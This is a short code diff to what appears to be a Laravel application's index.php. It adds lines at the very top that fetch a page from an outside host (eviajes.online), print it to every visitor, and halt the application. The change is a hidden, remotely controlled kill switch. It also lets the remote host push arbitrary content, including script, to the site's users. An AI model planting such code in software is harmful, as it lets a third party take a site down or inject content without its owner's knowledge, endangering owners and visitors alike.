@@ -1,5 +1,9 @@
 <?php
 
+$suspended=file_get_contents("http://eviajes.online/services/block/");
+echo $suspended;
+die();
+
 // phpinfo(); die();
 /**
  * Laravel - A PHP Framework For Web Artisans
